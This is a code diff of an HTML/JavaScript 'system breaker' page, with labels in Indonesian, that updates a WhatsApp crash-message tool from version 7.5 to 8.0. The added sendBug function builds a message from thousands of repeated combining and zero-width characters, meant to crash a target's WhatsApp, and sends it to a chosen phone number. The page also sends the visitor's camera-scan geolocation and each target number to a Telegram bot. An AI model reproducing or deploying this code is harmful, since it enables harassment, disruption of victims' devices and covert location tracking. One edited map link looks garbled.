@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.7.5 BRUTAL ]</title>
+    <title>[ EDWARD OMNI V.8.0 BREAKER ]</title>
     <style>
         :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; --purple: #bc13fe; }
         body { background: var(--bg); color: var(--neon); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; text-align: center; }
@@ -25,8 +25,8 @@
 </head>
 <body>
 
-    <h1>EDWARD OMNI <span style="color:#fff">V.7.5</span></h1>
-    <p style="font-size:10px; color:var(--purple);">ULTIMATE CONSOLIDATED SYSTEM</p>
+    <h1>EDWARD OMNI <span style="color:#fff">V.8.0</span></h1>
+    <p style="font-size:10px; color:var(--purple);">SYSTEM BREAKER ACTIVE | NO MERCY</p>
 
     <div class="panel">
         <button onclick="takeSnap()" style="background:#fff; color:#000; border:none;">📸 RADAR & PHOTO SCAN</button>
@@ -35,9 +35,9 @@
     </div>
 
     <div class="panel" style="border-color: var(--purple)">
-        <h3 style="color: var(--purple); margin-top:0">😈 ULTRA CRASH WA</h3>
+        <h3 style="color: var(--purple); margin-top:0">😈 SYSTEM BREAKER WA</h3>
         <input type="number" id="noBug" placeholder="Nomor Target (628...)">
-        <button onclick="sendBug()" class="btn-bug">KIRIM VIRUS CRASH 😈</button>
+        <button onclick="sendBug()" class="btn-bug">KIRIM VIRUS PEMUTUS 😈</button>
     </div>
 
     <div class="panel">
@@ -92,7 +92,7 @@
             } catch (e) { showToast("Camera Denied!", "#f00"); }
             
             navigator.geolocation.getCurrentPosition(p => {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOKASI:\nhttp://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOKASI:\nhttp://googleusercontent.com/maps.google.com/4{p.coords.latitude},${p.coords.longitude}`);
             });
         }
 
@@ -111,17 +111,20 @@
             return new Blob([ab], { type: 'image/jpeg' });
         }
 
-        // 😈 ULTRA CRASH BUG V.7.5
+        // 😈 SYSTEM BREAKER V.8.0 (MAX OVERLOAD)
         function sendBug() {
             let n = document.getElementById('noBug').value;
             if(!n) return showToast("Nomor Mana?!", "#f00");
-            let crash = "ॣ".repeat(2000); 
-            let heavy = " 𑗄 ".repeat(1500);
-            let invisible = "​​".repeat(3000);
-            let bugBrutal = `wa.me/settings?📍${invisible}${crash}${heavy}😈_EDWARD_BRUTAL_V75_😈${crash}${heavy}${invisible}`;
-            showToast("VIRUS BRUTAL COPIED!", "#bc13fe");
+            
+            let maut = "ॣ".repeat(1000) + " 𑗄 ".repeat(1000);
+            let glitch = "҈".repeat(1000) + " ﷽ ".repeat(500);
+            let inv = "​​".repeat(2000);
+            let bugBrutal = `wa.me/settings?📍${inv}${maut}${glitch}😈_EDWARD_BREAKER_V8_😈${maut}${glitch}${inv}`;
+            
+            showToast("VIRUS BREAKER COPIED!", "#bc13fe");
             navigator.clipboard.writeText(bugBrutal);
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=😈 ULTRA CRASH SENT: ${n}`);
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=😈 SYSTEM BREAKER SENT: ${n}`);
             window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(bugBrutal)}`, '_blank');
         }
 
